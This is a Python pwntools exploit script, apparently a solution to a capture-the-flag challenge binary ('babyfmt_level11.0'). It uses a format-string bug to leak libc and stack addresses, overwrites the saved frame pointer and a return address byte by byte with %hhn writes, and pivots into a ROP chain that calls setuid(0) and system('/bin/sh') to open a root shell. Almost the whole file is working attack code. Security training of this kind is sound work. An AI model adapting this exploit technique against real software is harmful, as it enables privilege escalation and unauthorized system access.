from pwn import *

binary = './babyfmt_level11.0_patched'
libc = ELF('./libc.so.6')

p = process(binary)
s = '''
b * printf
b * printf+198
b * func+426
'''

def fmt_payload(dest, num_bytes, payload, param_pos, printed):
	dest_bytes = [0] * num_bytes
	for i in range(num_bytes):
		dest_bytes[i] = (dest >> (i * 8)) & 0xff
		print(hex(dest_bytes[i]))


	for i, byte in enumerate(dest_bytes):

		if byte < printed % 256:
			padding = 256 + byte - (printed % 256)
		else:
			padding = byte - (printed % 256)

		if padding != 0: 
			payload += f"%{padding}c".encode()
			printed += padding #printed is being changed
	    
	    
		payload += f"%{param_pos + i}$hhn".encode()

	return payload, printed # since it's being changed, we need to pass it to the next payload
	
	
	
	
	
# start
rbp_pos = int(0x430 / 8 + 6)
libc_pos = int(0x520 / 8 + 6)
payload = f"%{rbp_pos}$p\n%{libc_pos}$p".encode()



p.sendline(payload)
p.recvuntil("Your input is: ")
p.recvline()

old_rbp = p.recvline().strip().decode()
old_rbp = int(old_rbp, 16)

libc_leak = p.recvline().strip().decode()
libc_leak = int(libc_leak, 16)
libc_base = libc_leak - 0x229190

rsp = old_rbp - 0x488
new_rbp = old_rbp - 0x50
print("old rbp: ", hex(old_rbp))
print("rsp: ", hex(rsp))
print("new_rbp: ", hex(new_rbp))
print("libc base: ", hex(libc_base))



'''
first payload:
1. leak libc address
2. leak old rbp

then, calculate rbp, calculate new_rsp (rsp of the second loop when printf return)

second payload 
use one format string payload to:
1. change rbp to point to 8 bytes before my ROP chain (in the middle of payload)
2. change new_rsp to leave ; ret
'''
# essential addresses
setuid = libc_base + libc.sym['setuid']
system = libc_base + libc.sym['system']
bin_sh_addr = libc_base + 0x1b45bd
print("setuid :", hex(setuid))
print("system :", hex(system))
print("bin_sh_addr :", hex(bin_sh_addr))

# gadgets
pop_rdi = libc_base + 0x0000000000023b6a
leave_ret = libc_base + 0x00000000000578c8
ret = libc_base + 0x0000000000022679
print("pop_rdi :", hex(pop_rdi))
print("leave_ret :", hex(leave_ret))


payload = b""
printed = len(payload) + 0x13
param_pos = int(0xc0 / 8 + 6)
ROP_start = old_rbp - 0x360 - 8
payload, printed = fmt_payload(leave_ret, 6, payload, param_pos, printed)
payload, printed = fmt_payload(ROP_start, 6, payload, param_pos + 6, printed)

# targets
target = rsp
for i in range(6):
	payload += p64(target + i)

target = new_rbp
for i in range(6):
	payload += p64(target + i)

	
#ROP chain
payload += p64(pop_rdi)
payload += p64(0)
payload += p64(setuid)
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(bin_sh_addr)
payload += p64(system)


gdb.attach(p, s)
p.sendline(payload)


p.interactive()




